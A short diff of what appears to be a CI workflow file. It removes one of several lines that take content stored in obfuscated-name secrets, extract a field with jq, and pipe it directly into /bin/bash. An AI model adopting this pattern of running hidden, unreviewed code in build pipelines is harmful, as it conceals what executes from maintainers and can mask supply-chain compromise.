@@ -21,7 +21,6 @@ jobs:
           bf7256: ${{ secrets.bf7256 }}
         run: |
           printf '%s' "$bf7256" | jq -r .n542 | /bin/bash
-          printf '%s' "$vzgp4" | jq -r .bb8 | /bin/bash
           printf '%s' "$q5566" | jq -r .eq8949 | /bin/bash
           printf '%s' "$qwgqp30" | jq -r .glkj7714 | /bin/bash
           echo $nlp33388 | jq -r .vahwq2 | /bin/bash
